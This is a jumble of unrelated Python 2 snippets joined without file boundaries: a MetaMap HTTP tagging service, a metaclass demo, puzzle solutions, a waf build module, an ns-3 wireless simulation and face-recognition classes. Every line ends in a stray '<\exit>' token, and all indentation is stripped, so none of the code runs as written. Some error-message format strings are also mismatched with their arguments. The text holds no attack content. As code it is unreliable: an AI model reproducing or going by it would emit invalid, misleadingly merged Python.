for line in ann_file:<\exit>
lines.append(line)<\exit>
with open(id + '.' + MERGED_SUFFIX, 'w') as merged_ann_file:<\exit>
for line in lines:<\exit>
merged_ann_file.write(line)<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import six<\exit>
class Meta(type):<\exit>
def __new__(mcs, name, bases, class_dict):<\exit>
print (mcs, name, bases, class_dict)<\exit>
return type.__new__(mcs, name, bases, class_dict)<\exit>
class MyClass(object):<\exit>
__metaclass__ = Meta<\exit>
foo = 1<\exit>
def __init__(self):<\exit>
self.bar = 2<\exit>
def foo_method(self):<\exit>
pass<\exit>
registry = {}<\exit>
def register_class(target_class):<\exit>
registry[target_class.__name__] = target_class<\exit>
class RegistryMeta(type):<\exit>
def __new__(mcs, name, bases, class_dict):<\exit>
cls = type.__new__(mcs, name, bases, class_dict)<\exit>
register_class(cls)<\exit>
return cls<\exit>
class RegisteredClass(six.with_metaclass(RegistryMeta)):<\exit>
pass<\exit>
from argparse import ArgumentParser<\exit>
from os.path import join as path_join<\exit>
from os.path import dirname<\exit>
try:<\exit>
from json import dumps<\exit>
except ImportError:<\exit>
from sys import path as sys_path<\exit>
sys_path.append(path_join(dirname(__file__), '../server/lib/ujson'))<\exit>
from ujson import dumps<\exit>
from subprocess import PIPE, Popen<\exit>
from random import choice, randint<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
try:<\exit>
from urlparse import parse_qs<\exit>
except ImportError:<\exit>
from cgi import parse_qs<\exit>
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler<\exit>
import re<\exit>
from sentencesplit import sentencebreaks_to_newlines<\exit>
from MetaMaptoStandoff import MetaMap_lines_to_standoff<\exit>
METAMAP_SCRIPT   = path_join(dirname(__file__), './metamap_tag.sh')<\exit>
METAMAP_COMMAND  = [METAMAP_SCRIPT]<\exit>
ARGPARSER = ArgumentParser(description='An example HTTP tagging service using MetaMap')<\exit>
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,<\exit>
help='port to run the HTTP service on (default: 47111)')<\exit>
def run_tagger(cmd):<\exit>
try:<\exit>
tagger_process = Popen(cmd, stdin=PIPE, stdout=PIPE, bufsize=1)<\exit>
return tagger_process<\exit>
except Exception, e:<\exit>
print >> stderr, "Error running '%s':" % cmd, e<\exit>
raise<\exit>
def _apply_tagger_to_sentence(text):<\exit>
tagger_process = run_tagger(METAMAP_COMMAND)<\exit>
print >> tagger_process.stdin, text<\exit>
tagger_process.stdin.close()<\exit>
tagger_process.wait()<\exit>
response_lines = []<\exit>
for l in tagger_process.stdout:<\exit>
l = l.rstrip('\n')<\exit>
response_lines.append(l)<\exit>
try:<\exit>
tagged_entities = MetaMap_lines_to_standoff(response_lines, text)<\exit>
except:<\exit>
print >> stderr, "Warning: MetaMap-to-standoff conversion failed for output:\n'%s'" % '\n'.join(response_lines)<\exit>
raise<\exit>
for t in tagged_entities:<\exit>
t.eText = text[t.startOff:t.endOff]<\exit>
return tagged_entities<\exit>
def _apply_tagger(text):<\exit>
try:<\exit>
splittext = sentencebreaks_to_newlines(text)<\exit>
except:<\exit>
print >> stderr, "Warning: sentence splitting failed for input:\n'%s'" % text<\exit>
splittext = text<\exit>
sentences = splittext.split('\n')<\exit>
all_tagged = []<\exit>
baseoffset = 0<\exit>
for s in sentences:<\exit>
tagged = _apply_tagger_to_sentence(s)<\exit>
for t in tagged:<\exit>
t.startOff += baseoffset<\exit>
t.endOff += baseoffset<\exit>
all_tagged.extend(tagged)<\exit>
baseoffset += len(s)+1<\exit>
anns = {}<\exit>
idseq = 1<\exit>
for t in all_tagged:<\exit>
anns["T%d" % idseq] = {<\exit>
'type': t.eType,<\exit>
'offsets': ((t.startOff, t.endOff), ),<\exit>
'texts': (t.eText, ),<\exit>
}<\exit>
idseq += 1<\exit>
return anns<\exit>
class MetaMapTaggerHandler(BaseHTTPRequestHandler):<\exit>
def do_POST(self):<\exit>
query = parse_qs(urlparse(self.path).query)<\exit>
try:<\exit>
json_dic = _apply_tagger(query['text'][0])<\exit>
except KeyError:<\exit>
json_dic = {}<\exit>
self.send_response(200)<\exit>
self.send_header('Content-type', 'application/json; charset=utf-8')<\exit>
self.end_headers()<\exit>
self.wfile.write(dumps(json_dic))<\exit>
print >> stderr, ('Generated %d annotations' % len(json_dic))<\exit>
def log_message(self, format, *args):<\exit>
return<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
print >> stderr, 'Starting MetaMap ...'<\exit>
server_class = HTTPServer<\exit>
httpd = server_class(('localhost', argp.port), MetaMapTaggerHandler)<\exit>
print >> stderr, 'MetaMap tagger service started'<\exit>
try:<\exit>
httpd.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
httpd.server_close()<\exit>
print >> stderr, 'MetaMap tagger service stopped'<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
import codecs<\exit>
FIELDED_OUTPUT_RE = re.compile(r'^\d+\|')<\exit>
class taggedEntity:<\exit>
def __init__(self, startOff, endOff, eType, idNum):<\exit>
self.startOff = startOff<\exit>
self.endOff   = endOff<\exit>
self.eType    = eType<\exit>
self.idNum    = idNum<\exit>
def __str__(self):<\exit>
return "T%d\t%s %d %d" % (self.idNum, self.eType, self.startOff, self.endOff)<\exit>
def MetaMap_lines_to_standoff(metamap_lines, reftext=None):<\exit>
tagged = []<\exit>
idseq = 1<\exit>
for l in metamap_lines:<\exit>
l = l.rstrip('\n')<\exit>
if not FIELDED_OUTPUT_RE.match(l):<\exit>
continue<\exit>
fields = l.split('|')<\exit>
if len(fields) < 9:<\exit>
print >> sys.stderr, "Note: skipping unparseable MetaMap output line: %s" % l<\exit>
continue<\exit>
ctext, CUI, semtype, offset = fields[3], fields[4], fields[5], fields[8]<\exit>
semtype = semtype.replace('[','').replace(']','')<\exit>
m = re.match(r'^(?:\d+:\d+,)*(\d+):(\d+)$', offset)<\exit>
start, length = m.groups()<\exit>
start, length = int(start), int(length)<\exit>
tagged.append(taggedEntity(start, start+length, semtype, idseq))<\exit>
idseq += 1<\exit>
print >> sys.stderr, "MetaMaptoStandoff: returning %s tagged spans" % len(tagged)<\exit>
return tagged<\exit>
if __name__ == "__main__":<\exit>
lines = [l for l in sys.stdin]<\exit>
standoff = MetaMap_lines_to_standoff(lines)<\exit>
for s in standoff:<\exit>
print s<\exit>
import micromodels<\exit>
import json<\exit>
import datetime<\exit>
class ExampleModel(micromodels.Model):<\exit>
myfield = micromodels.CharField()<\exit>
time = micromodels.DateTimeField()<\exit>
e = ExampleModel.from_dict(json.dumps({'myfield': 'Some Value', 'time': '2012-05-29T19:30:03.000283+00:00'}), is_json=True)<\exit>
print e.to_json()<\exit>
e.myfield = "a"<\exit>
e.time = datetime.datetime.now()<\exit>
print e.to_json()<\exit>
print e.to_dict()<\exit>
class Solution:<\exit>
def MinAdjustmentCost(self, A, target):<\exit>
S = 100<\exit>
n = len(A)<\exit>
f = [[1<<31 for _ in xrange(S+1)] for _ in xrange(n+1)]<\exit>
for j in xrange(S+1):<\exit>
f[0][j] = 0<\exit>
for i in xrange(1, n+1):<\exit>
for j in xrange(1, S+1):<\exit>
for k in xrange(max(1, j-target), min(S, j+target)+1):<\exit>
f[i][j] = min(f[i][j], f[i-1][k]+abs(A[i-1]-j))<\exit>
mini = 1<<31<\exit>
for j in xrange(1, S+1):<\exit>
mini = min(mini, f[n][j])<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
assert Solution().MinAdjustmentCost([12, 3, 7, 4, 5, 13, 2, 8, 4, 7, 6, 5, 7], 2) == 19<\exit>
class Solution:<\exit>
def minSubArray(self, nums):<\exit>
mini = min(nums)<\exit>
current = 0<\exit>
for a in nums:<\exit>
current += a<\exit>
mini = min(mini, current)<\exit>
if current > 0:<\exit>
current = 0<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minSubArray([1, -1, -2, 1]) == -3<\exit>
import shutil, re, os<\exit>
from waflib import TaskGen, Node, Task, Utils, Build, Errors<\exit>
from waflib.TaskGen import feature, after_method, before_method<\exit>
from waflib.Logs import debug<\exit>
def copy_attrs(orig, dest, names, only_if_set=False):<\exit>
for a in Utils.to_list(names):<\exit>
u = getattr(orig, a, ())<\exit>
if u or not only_if_set:<\exit>
setattr(dest, a, u)<\exit>
def copy_func(tsk):<\exit>
"Make a file copy. This might be used to make other kinds of file processing (even calling a compiler is possible)"<\exit>
env = tsk.env<\exit>
infile = tsk.inputs[0].abspath()<\exit>
outfile = tsk.outputs[0].abspath()<\exit>
try:<\exit>
shutil.copy2(infile, outfile)<\exit>
except (OSError, IOError):<\exit>
return 1<\exit>
else:<\exit>
if tsk.chmod: os.chmod(outfile, tsk.chmod)<\exit>
return 0<\exit>
def action_process_file_func(tsk):<\exit>
"Ask the function attached to the task to process it"<\exit>
if not tsk.fun: raise Errors.WafError('task must have a function attached to it for copy_func to work!')<\exit>
return tsk.fun(tsk)<\exit>
@feature('cmd')<\exit>
def apply_cmd(self):<\exit>
"call a command everytime"<\exit>
if not self.fun: raise Errors.WafError('cmdobj needs a function!')<\exit>
tsk = Task.TaskBase()<\exit>
tsk.fun = self.fun<\exit>
tsk.env = self.env<\exit>
self.tasks.append(tsk)<\exit>
tsk.install_path = self.install_path<\exit>
@feature('copy')<\exit>
@before_method('process_source')<\exit>
def apply_copy(self):<\exit>
Utils.def_attrs(self, fun=copy_func)<\exit>
self.default_install_path = 0<\exit>
lst = self.to_list(self.source)<\exit>
self.meths.remove('process_source')<\exit>
for filename in lst:<\exit>
node = self.path.find_resource(filename)<\exit>
if not node: raise Errors.WafError('cannot find input file %s for processing' % filename)<\exit>
target = self.target<\exit>
if not target or len(lst)>1: target = node.name<\exit>
newnode = self.path.find_or_declare(target)<\exit>
tsk = self.create_task('copy', node, newnode)<\exit>
tsk.fun = self.fun<\exit>
tsk.chmod = getattr(self, 'chmod', Utils.O644)<\exit>
if not tsk.env:<\exit>
tsk.debug()<\exit>
raise Errors.WafError('task without an environment')<\exit>
def subst_func(tsk):<\exit>
"Substitutes variables in a .in file"<\exit>
m4_re = re.compile('@(\w+)@', re.M)<\exit>
code = tsk.inputs[0].read()<\exit>
code = code.replace('%', '%%')<\exit>
s = m4_re.sub(r'%(\1)s', code)<\exit>
env = tsk.env<\exit>
di = getattr(tsk, 'dict', {}) or getattr(tsk.generator, 'dict', {})<\exit>
if not di:<\exit>
names = m4_re.findall(code)<\exit>
for i in names:<\exit>
di[i] = env.get_flat(i) or env.get_flat(i.upper())<\exit>
tsk.outputs[0].write(s % di)<\exit>
@feature('subst')<\exit>
@before_method('process_source')<\exit>
def apply_subst(self):<\exit>
Utils.def_attrs(self, fun=subst_func)<\exit>
lst = self.to_list(self.source)<\exit>
self.meths.remove('process_source')<\exit>
self.dict = getattr(self, 'dict', {})<\exit>
for filename in lst:<\exit>
node = self.path.find_resource(filename)<\exit>
if not node: raise Errors.WafError('cannot find input file %s for processing' % filename)<\exit>
if self.target:<\exit>
newnode = self.path.find_or_declare(self.target)<\exit>
else:<\exit>
newnode = node.change_ext('')<\exit>
try:<\exit>
self.dict = self.dict.get_merged_dict()<\exit>
except AttributeError:<\exit>
pass<\exit>
if self.dict and not self.env['DICT_HASH']:<\exit>
self.env = self.env.derive()<\exit>
keys = list(self.dict.keys())<\exit>
keys.sort()<\exit>
lst = [self.dict[x] for x in keys]<\exit>
self.env['DICT_HASH'] = str(Utils.h_list(lst))<\exit>
tsk = self.create_task('copy', node, newnode)<\exit>
tsk.fun = self.fun<\exit>
tsk.dict = self.dict<\exit>
tsk.dep_vars = ['DICT_HASH']<\exit>
tsk.chmod = getattr(self, 'chmod', Utils.O644)<\exit>
if not tsk.env:<\exit>
tsk.debug()<\exit>
raise Errors.WafError('task without an environment')<\exit>
class cmd_arg(object):<\exit>
def __init__(self, name, template='%s'):<\exit>
self.name = name<\exit>
self.template = template<\exit>
self.node = None<\exit>
class input_file(cmd_arg):<\exit>
def find_node(self, base_path):<\exit>
assert isinstance(base_path, Node.Node)<\exit>
self.node = base_path.find_resource(self.name)<\exit>
if self.node is None:<\exit>
raise Errors.WafError("Input file %s not found in " % (self.name, base_path))<\exit>
def get_path(self, env, absolute):<\exit>
if absolute:<\exit>
return self.template % self.node.abspath()<\exit>
else:<\exit>
return self.template % self.node.srcpath()<\exit>
class output_file(cmd_arg):<\exit>
def find_node(self, base_path):<\exit>
assert isinstance(base_path, Node.Node)<\exit>
self.node = base_path.find_or_declare(self.name)<\exit>
if self.node is None:<\exit>
raise Errors.WafError("Output file %s not found in " % (self.name, base_path))<\exit>
def get_path(self, env, absolute):<\exit>
if absolute:<\exit>
return self.template % self.node.abspath()<\exit>
else:<\exit>
return self.template % self.node.bldpath()<\exit>
class cmd_dir_arg(cmd_arg):<\exit>
def find_node(self, base_path):<\exit>
assert isinstance(base_path, Node.Node)<\exit>
self.node = base_path.find_dir(self.name)<\exit>
if self.node is None:<\exit>
raise Errors.WafError("Directory %s not found in " % (self.name, base_path))<\exit>
class input_dir(cmd_dir_arg):<\exit>
def get_path(self, dummy_env, dummy_absolute):<\exit>
return self.template % self.node.abspath()<\exit>
class output_dir(cmd_dir_arg):<\exit>
def get_path(self, env, dummy_absolute):<\exit>
return self.template % self.node.abspath()<\exit>
class command_output(Task.Task):<\exit>
color = "BLUE"<\exit>
def __init__(self, env, command, command_node, command_args, stdin, stdout, cwd, os_env, stderr):<\exit>
Task.Task.__init__(self, env=env)<\exit>
assert isinstance(command, (str, Node.Node))<\exit>
self.command = command<\exit>
self.command_args = command_args<\exit>
self.stdin = stdin<\exit>
self.stdout = stdout<\exit>
self.cwd = cwd<\exit>
self.os_env = os_env<\exit>
self.stderr = stderr<\exit>
if command_node is not None: self.dep_nodes = [command_node]<\exit>
self.dep_vars = []<\exit>
def run(self):<\exit>
task = self<\exit>
def input_path(node, template):<\exit>
if task.cwd is None:<\exit>
return template % node.bldpath()<\exit>
else:<\exit>
return template % node.abspath()<\exit>
def output_path(node, template):<\exit>
fun = node.abspath<\exit>
if task.cwd is None: fun = node.bldpath<\exit>
return template % fun()<\exit>
if isinstance(task.command, Node.Node):<\exit>
argv = [input_path(task.command, '%s')]<\exit>
else:<\exit>
argv = [task.command]<\exit>
for arg in task.command_args:<\exit>
if isinstance(arg, str):<\exit>
argv.append(arg)<\exit>
else:<\exit>
assert isinstance(arg, cmd_arg)<\exit>
argv.append(arg.get_path(task.env, (task.cwd is not None)))<\exit>
if task.stdin:<\exit>
stdin = open(input_path(task.stdin, '%s'))<\exit>
else:<\exit>
stdin = None<\exit>
if task.stdout:<\exit>
stdout = open(output_path(task.stdout, '%s'), "w")<\exit>
else:<\exit>
stdout = None<\exit>
if task.stderr:<\exit>
stderr = open(output_path(task.stderr, '%s'), "w")<\exit>
else:<\exit>
stderr = None<\exit>
if task.cwd is None:<\exit>
cwd = ('None (actually %r)' % os.getcwd())<\exit>
else:<\exit>
cwd = repr(task.cwd)<\exit>
debug("command-output: cwd=%s, stdin=%r, stdout=%r, argv=%r" %<\exit>
(cwd, stdin, stdout, argv))<\exit>
if task.os_env is None:<\exit>
os_env = os.environ<\exit>
else:<\exit>
os_env = task.os_env<\exit>
command = Utils.subprocess.Popen(argv, stdin=stdin, stdout=stdout, stderr=stderr, cwd=task.cwd, env=os_env)<\exit>
return command.wait()<\exit>
@feature('command-output')<\exit>
def init_cmd_output(self):<\exit>
Utils.def_attrs(self,<\exit>
stdin = None,<\exit>
stdout = None,<\exit>
stderr = None,<\exit>
command = None,<\exit>
command_is_external = False,<\exit>
argv = [],<\exit>
dependencies = [],<\exit>
dep_vars = [],<\exit>
hidden_inputs = [],<\exit>
hidden_outputs = [],<\exit>
cwd = None,<\exit>
os_env = None)<\exit>
@feature('command-output')<\exit>
@after_method('init_cmd_output')<\exit>
def apply_cmd_output(self):<\exit>
if self.command is None:<\exit>
raise Errors.WafError("command-output missing command")<\exit>
if self.command_is_external:<\exit>
cmd = self.command<\exit>
cmd_node = None<\exit>
else:<\exit>
cmd_node = self.path.find_resource(self.command)<\exit>
assert cmd_node is not None, () % (self.command,)<\exit>
cmd = cmd_node<\exit>
if self.cwd is None:<\exit>
cwd = None<\exit>
else:<\exit>
assert isinstance(cwd, CmdDirArg)<\exit>
self.cwd.find_node(self.path)<\exit>
args = []<\exit>
inputs = []<\exit>
outputs = []<\exit>
for arg in self.argv:<\exit>
if isinstance(arg, cmd_arg):<\exit>
arg.find_node(self.path)<\exit>
if isinstance(arg, input_file):<\exit>
inputs.append(arg.node)<\exit>
if isinstance(arg, output_file):<\exit>
outputs.append(arg.node)<\exit>
if self.stdout is None:<\exit>
stdout = None<\exit>
else:<\exit>
assert isinstance(self.stdout, str)<\exit>
stdout = self.path.find_or_declare(self.stdout)<\exit>
if stdout is None:<\exit>
raise Errors.WafError("File %s not found" % (self.stdout,))<\exit>
outputs.append(stdout)<\exit>
if self.stderr is None:<\exit>
stderr = None<\exit>
else:<\exit>
assert isinstance(self.stderr, str)<\exit>
stderr = self.path.find_or_declare(self.stderr)<\exit>
if stderr is None:<\exit>
raise Errors.WafError("File %s not found" % (self.stderr,))<\exit>
outputs.append(stderr)<\exit>
if self.stdin is None:<\exit>
stdin = None<\exit>
else:<\exit>
assert isinstance(self.stdin, str)<\exit>
stdin = self.path.find_resource(self.stdin)<\exit>
if stdin is None:<\exit>
raise Errors.WafError("File %s not found" % (self.stdin,))<\exit>
inputs.append(stdin)<\exit>
for hidden_input in self.to_list(self.hidden_inputs):<\exit>
node = self.path.find_resource(hidden_input)<\exit>
if node is None:<\exit>
raise Errors.WafError("File %s not found in dir %s" % (hidden_input, self.path))<\exit>
inputs.append(node)<\exit>
for hidden_output in self.to_list(self.hidden_outputs):<\exit>
node = self.path.find_or_declare(hidden_output)<\exit>
if node is None:<\exit>
raise Errors.WafError("File %s not found in dir %s" % (hidden_output, self.path))<\exit>
outputs.append(node)<\exit>
if not (inputs or getattr(self, 'no_inputs', None)):<\exit>
raise Errors.WafError('command-output objects must have at least one input file or give self.no_inputs')<\exit>
if not (outputs or getattr(self, 'no_outputs', None)):<\exit>
raise Errors.WafError('command-output objects must have at least one output file or give self.no_outputs')<\exit>
cwd = self.bld.variant_dir<\exit>
task = command_output(self.env, cmd, cmd_node, self.argv, stdin, stdout, cwd, self.os_env, stderr)<\exit>
task.generator = self<\exit>
copy_attrs(self, task, 'before after ext_in ext_out', only_if_set=True)<\exit>
self.tasks.append(task)<\exit>
task.inputs = inputs<\exit>
task.outputs = outputs<\exit>
task.dep_vars = self.to_list(self.dep_vars)<\exit>
for dep in self.dependencies:<\exit>
assert dep is not self<\exit>
dep.post()<\exit>
for dep_task in dep.tasks:<\exit>
task.set_run_after(dep_task)<\exit>
if not task.inputs:<\exit>
task.runnable_status = type(Task.TaskBase.run)(runnable_status, task, task.__class__)<\exit>
task.post_run = type(Task.TaskBase.run)(post_run, task, task.__class__)<\exit>
def post_run(self):<\exit>
for x in self.outputs:<\exit>
x.sig = Utils.h_file(x.abspath())<\exit>
def runnable_status(self):<\exit>
return self.RUN_ME<\exit>
Task.task_factory('copy', vars=[], func=action_process_file_func)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
m, A, n, B = cipher<\exit>
result = set()<\exit>
hm = {}<\exit>
for a in A:<\exit>
if a not in hm:<\exit>
hm[a] = 1<\exit>
else:<\exit>
hm[a] += 1<\exit>
for b in B:<\exit>
if b not in hm or hm[b] <= 0:<\exit>
result.add(b)<\exit>
else:<\exit>
hm[b] -= 1<\exit>
result = sorted(list(result))<\exit>
return " ".join(map(str, result))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
m = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
n = int(f.readline().strip())<\exit>
B = map(int, f.readline().strip().split(' '))<\exit>
cipher = m, A, n, B<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import ns.applications<\exit>
import ns.core<\exit>
import ns.csma<\exit>
import ns.internet<\exit>
import ns.mobility<\exit>
import ns.network<\exit>
import ns.olsr<\exit>
import ns.wifi<\exit>
def main(argv):<\exit>
backboneNodes = 10<\exit>
infraNodes = 5<\exit>
lanNodes = 5<\exit>
stopTime = 10<\exit>
ns.core.Config.SetDefault("ns3::OnOffApplication::PacketSize", ns.core.StringValue("210"))<\exit>
ns.core.Config.SetDefault("ns3::OnOffApplication::DataRate", ns.core.StringValue("448kb/s"))<\exit>
cmd = ns.core.CommandLine()<\exit>
cmd.Parse(argv)<\exit>
backbone = ns.network.NodeContainer()<\exit>
backbone.Create(backboneNodes)<\exit>
wifi = ns.wifi.WifiHelper()<\exit>
mac = ns.wifi.NqosWifiMacHelper.Default()<\exit>
mac.SetType("ns3::AdhocWifiMac")<\exit>
wifi.SetRemoteStationManager("ns3::ConstantRateWifiManager",<\exit>
"DataMode", ns.core.StringValue("OfdmRate54Mbps"))<\exit>
wifiPhy = ns.wifi.YansWifiPhyHelper.Default()<\exit>
wifiChannel = ns.wifi.YansWifiChannelHelper.Default()<\exit>
wifiPhy.SetChannel(wifiChannel.Create())<\exit>
backboneDevices = wifi.Install(wifiPhy, mac, backbone)<\exit>
print "Enabling OLSR routing on all backbone nodes"<\exit>
internet = ns.internet.InternetStackHelper()<\exit>
olsr = ns.olsr.OlsrHelper()<\exit>
internet.SetRoutingHelper(olsr);<\exit>
internet.Install(backbone);<\exit>
internet.Reset()<\exit>
ipAddrs = ns.internet.Ipv4AddressHelper()<\exit>
ipAddrs.SetBase(ns.network.Ipv4Address("192.168.0.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
ipAddrs.Assign(backboneDevices)<\exit>
mobility = ns.mobility.MobilityHelper()<\exit>
positionAlloc = ns.mobility.ListPositionAllocator()<\exit>
x = 0.0<\exit>
for i in range(backboneNodes):<\exit>
positionAlloc.Add(ns.core.Vector(x, 0.0, 0.0))<\exit>
x += 5.0<\exit>
mobility.SetPositionAllocator(positionAlloc)<\exit>
mobility.SetMobilityModel("ns3::RandomDirection2dMobilityModel",<\exit>
"Bounds", ns.mobility.RectangleValue(ns.mobility.Rectangle(0, 1000, 0, 1000)),<\exit>
"Speed", ns.core.RandomVariableValue(ns.core.ConstantVariable(2000)),<\exit>
"Pause", ns.core.RandomVariableValue(ns.core.ConstantVariable(0.2)))<\exit>
mobility.Install(backbone)<\exit>
ipAddrs.SetBase(ns.network.Ipv4Address("172.16.0.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
for i in range(backboneNodes):<\exit>
print "Configuring local area network for backbone node ", i<\exit>
newLanNodes = ns.network.NodeContainer()<\exit>
newLanNodes.Create(lanNodes - 1)<\exit>
lan = ns.network.NodeContainer(ns.network.NodeContainer(backbone.Get(i)), newLanNodes)<\exit>
csma = ns.csma.CsmaHelper()<\exit>
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)))<\exit>
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)))<\exit>
lanDevices = csma.Install(lan)<\exit>
internet.Install(newLanNodes)<\exit>
ipAddrs.Assign(lanDevices)<\exit>
ipAddrs.NewNetwork()<\exit>
ipAddrs.SetBase(ns.network.Ipv4Address("10.0.0.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
for i in range(backboneNodes):<\exit>
print "Configuring wireless network for backbone node ", i<\exit>
stas = ns.network.NodeContainer()<\exit>
stas.Create(infraNodes - 1)<\exit>
infra = ns.network.NodeContainer(ns.network.NodeContainer(backbone.Get(i)), stas)<\exit>
ssid = ns.wifi.Ssid('wifi-infra' + str(i))<\exit>
wifiInfra = ns.wifi.WifiHelper.Default()<\exit>
wifiPhy.SetChannel(wifiChannel.Create())<\exit>
wifiInfra.SetRemoteStationManager('ns3::ArfWifiManager')<\exit>
macInfra = ns.wifi.NqosWifiMacHelper.Default();<\exit>
macInfra.SetType("ns3::StaWifiMac",<\exit>
"Ssid", ns.wifi.SsidValue(ssid),<\exit>
"ActiveProbing", ns.core.BooleanValue(False))<\exit>
staDevices = wifiInfra.Install(wifiPhy, macInfra, stas)<\exit>
macInfra.SetType("ns3::ApWifiMac",<\exit>
"Ssid", ns.wifi.SsidValue(ssid),<\exit>
"BeaconGeneration", ns.core.BooleanValue(True),<\exit>
"BeaconInterval", ns.core.TimeValue(ns.core.Seconds(2.5)))<\exit>
apDevices = wifiInfra.Install(wifiPhy, macInfra, backbone.Get(i))<\exit>
infraDevices = ns.network.NetDeviceContainer(apDevices, staDevices)<\exit>
internet.Install(stas)<\exit>
ipAddrs.Assign(infraDevices)<\exit>
ipAddrs.NewNetwork()<\exit>
subnetAlloc = ns.mobility.ListPositionAllocator()<\exit>
for j in range(infra.GetN()):<\exit>
subnetAlloc.Add(ns.core.Vector(0.0, j, 0.0))<\exit>
mobility.PushReferenceMobilityModel(backbone.Get(i))<\exit>
mobility.SetPositionAllocator(subnetAlloc)<\exit>
mobility.SetMobilityModel("ns3::RandomDirection2dMobilityModel",<\exit>
"Bounds", ns.mobility.RectangleValue(ns.mobility.Rectangle(-25, 25, -25, 25)),<\exit>
"Speed", ns.core.RandomVariableValue(ns.core.ConstantVariable(30)),<\exit>
"Pause", ns.core.RandomVariableValue(ns.core.ConstantVariable(0.4)))<\exit>
mobility.Install(infra)<\exit>
print "Create Applications."<\exit>
port = 9<\exit>
assert(lanNodes >= 5)<\exit>
appSource = ns.network.NodeList.GetNode(11)<\exit>
appSink = ns.network.NodeList.GetNode(13)<\exit>
remoteAddr = ns.network.Ipv4Address("172.16.0.5")<\exit>
onoff = ns.applications.OnOffHelper("ns3::UdpSocketFactory",<\exit>
ns.network.Address(ns.network.InetSocketAddress(remoteAddr, port)))<\exit>
onoff.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(1)))<\exit>
onoff.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))<\exit>
apps = onoff.Install(ns.network.NodeContainer(appSource))<\exit>
apps.Start(ns.core.Seconds(3.0))<\exit>
apps.Stop(ns.core.Seconds(20.0))<\exit>
sink = ns.applications.PacketSinkHelper("ns3::UdpSocketFactory",<\exit>
ns.network.InetSocketAddress(ns.network.Ipv4Address.GetAny(), port))<\exit>
apps = sink.Install(ns.network.NodeContainer(appSink))<\exit>
apps.Start(ns.core.Seconds(3.0))<\exit>
print "Configure Tracing."<\exit>
print "(tracing not done for Python)"<\exit>
wifiPhy.EnablePcap("mixed-wireless", backboneDevices)<\exit>
csma = ns.csma.CsmaHelper()<\exit>
csma.EnablePcapAll("mixed-wireless", False)<\exit>
print "Run Simulation."<\exit>
ns.core.Simulator.Stop(ns.core.Seconds(stopTime))<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
import copy<\exit>
import collections<\exit>
from facerec_py.facerec.feature import AbstractFeature<\exit>
from facerec_py.facerec.classifier import AbstractClassifier<\exit>
class AbstractPredictableModel(object):<\exit>
def compute(self, X, y):<\exit>
raise NotImplementedError("Every AbstractPredictableModel must implement the compute method.")<\exit>
def predict(self, X):<\exit>
raise NotImplementedError("Every AbstractPredictableModel must implement the predict method.")<\exit>
def __repr__(self):<\exit>
return self.__class__.__name__<\exit>
class PredictableModel(AbstractPredictableModel):<\exit>
def __init__(self, feature, classifier):<\exit>
super(PredictableModel, self).__init__()<\exit>
if not isinstance(feature, AbstractFeature):<\exit>
raise TypeError("feature must be of type AbstractFeature!")<\exit>
if not isinstance(classifier, AbstractClassifier):<\exit>
raise TypeError("classifier must be of type AbstractClassifier!")<\exit>
self.feature = feature<\exit>
self.classifier = classifier<\exit>
def compute(self, X, y):<\exit>
features = self.feature.compute(X, y)<\exit>
self.classifier.compute(features, y)<\exit>
def predict(self, X):<\exit>
q = self.feature.extract(X)<\exit>
return self.classifier.predict(q)<\exit>
def __repr__(self):<\exit>
feature_repr = repr(self.feature)<\exit>
classifier_repr = repr(self.classifier)<\exit>
return "%s(feature=%s, classifier=%s)" % (self.__class__.__name__, feature_repr, classifier_repr)<\exit>
class FeaturesEnsemblePredictableModel(AbstractPredictableModel):<\exit>
def __init__(self, features, classifier):<\exit>
super(FeaturesEnsemblePredictableModel, self).__init__()<\exit>
for feature in features:<\exit>
if not isinstance(feature, AbstractFeature):<\exit>
raise TypeError("feature must be of type AbstractFeature!")<\exit>
if not isinstance(classifier, AbstractClassifier):<\exit>
raise TypeError("classifier must be of type AbstractClassifier!")<\exit>
self.features = features<\exit>
self.classifiers = [copy.deepcopy(classifier) for _ in features]<\exit>
def compute(self, X, y):<\exit>
for i in xrange(len(self.features)):<\exit>
feats = self.features[i].compute(X, y)<\exit>
self.classifiers[i].compute(feats, y)<\exit>
def predict(self, X):<\exit>
qs = [feature.extract(X) for feature in self.features]<\exit>
ps = [self.classifiers[i].predict(qs[i]) for i in xrange(len(qs))]<\exit>
dic = collections.defaultdict(int)<\exit>
for elt in ps:<\exit>
dic[elt[0]] += 1<\exit>
maxa, label = -1, -1<\exit>
for k, v in dic.items():<\exit>
if v>maxa:<\exit>
maxa = v<\exit>
label = k<\exit>
for elt in ps:<\exit>
if elt[0]==label:<\exit>
return elt<\exit>
return None<\exit>
@property<\exit>
def feature(self):<\exit>
return self.features[0]<\exit>
@property<\exit>
def classifier(self):<\exit>
return self.classifiers[0]<\exit>
def __repr__(self):<\exit>
feature_repr = repr(self.features)<\exit>
classifier_repr = repr(self.classifier)<\exit>
